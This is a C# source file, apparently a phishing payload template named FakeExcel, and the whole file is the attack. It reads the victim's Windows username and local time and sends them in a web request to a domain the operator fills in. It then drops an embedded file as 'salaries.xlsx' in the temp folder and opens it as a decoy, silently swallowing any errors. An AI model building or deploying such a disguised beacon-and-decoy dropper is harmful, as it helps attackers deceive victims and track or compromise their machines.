using System;
using System.Net; // HttpWebRequest()
using System.IO; // File()
using System.Diagnostics; // Process()

namespace FakeExcel
{
    static class Program
    {
        static void Main(string[] args)
        {
            try
            {
                // Gets username
                string username = System.Security.Principal.WindowsIdentity.GetCurrent().Name;

                // Gets local time
                string time = DateTime.Now.ToString();

                // Domain for HTTP GET request
                string domain = "";

                // Performs HTTP GET request to specified domain
                string url = "https://" + domain + "/?id=" + username + "&date=" + time;
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();

                // Gets %TEMP% path
                string temp_path = System.IO.Path.GetTempPath();

                // Temp filename
                string temp_filename = temp_path + "salaries.xlsx";

                // Copies all bytes from resource section file to temp file
                // Executes that newly-created temp file after copy
                // Note: "global::FakeExcel.Properties.Resources.test" should be your resource section file
                File.WriteAllBytes(temp_filename, global::FakeExcel.Properties.Resources.test);
                Process.Start(temp_filename);
            }
            catch
            {
                // We do not care about any exceptions raised
            }    
        }
    }
}
